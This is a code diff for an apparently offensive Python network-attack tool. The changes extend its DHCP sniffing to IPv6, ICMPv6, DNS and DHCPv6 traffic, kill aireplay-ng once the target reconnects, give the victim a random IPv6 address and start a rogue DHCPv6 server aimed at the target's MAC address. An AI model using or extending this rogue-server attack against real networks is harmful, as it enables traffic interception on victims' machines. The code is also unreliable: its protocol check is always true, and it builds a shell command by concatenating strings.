@@ -24,6 +24,7 @@ from sys import exit, stdout
 from time import sleep
 from ipaddress import IPv4Address
 from socket import socket, AF_PACKET, SOCK_RAW
+from random import randint
 import re
 # endregion
 
@@ -267,7 +268,7 @@ def dhcp_request_sniffer_prn(request):
     # endregion
 
     # region Stop aireplay-ng
-    if 'ARP' or 'DHCP' in request.keys():
+    if 'ARP' or 'ICMPv6' or 'DHCP' or 'DHCPv6' or 'DNS' in request.keys():
         sniff_dhcp_request = True
         Base.kill_process_by_name('aireplay-ng')
     # endregion
@@ -304,7 +305,7 @@ def dhcp_request_sniffer():
     raw_socket = socket(AF_PACKET, SOCK_RAW)
     raw_socket.bind((listen_network_interface, 0))
 
-    sniff.start(protocols=['IP', 'ARP', 'UDP', 'DHCP'],
+    sniff.start(protocols=['IP', 'IPv6', 'ICMPv6', 'ARP', 'UDP', 'DNS', 'DHCP', 'DHCPv6'],
                 prn=dhcp_request_sniffer_prn, filters=network_filters)
     # endregion
 
@@ -602,7 +603,11 @@ if __name__ == "__main__":
                         index += 1
                 index = 0
 
-            Base.print_info("Target new ip: ", new_ip)
+            Base.print_info("Target new IP address: ", new_ip)
+
+        if args.ipv6:
+            new_ip = network_prefix_address + format(randint(1, 65535), 'x')
+            Base.print_info("Target new IPv6 address: ", new_ip)
         # endregion
 
         # region IPv4 address conflict technique
@@ -640,8 +645,7 @@ if __name__ == "__main__":
                     # Start DHCPv6 rogue server
                     sub.Popen(['python ' + script_dir + '/Scripts/DHCP/dhcpv6_rogue_server.py -i ' +
                                listen_network_interface + ' -t ' + target_mac_address +
-                               ' -p ' + network_prefix + ' -f ' + str(first_suffix) +
-                               ' -l ' + str(last_suffix) + ' -q &'],
+                               ' -T ' + new_ip + ' -p ' + network_prefix + ' -q &'],
                               shell=True)
 
                 else:
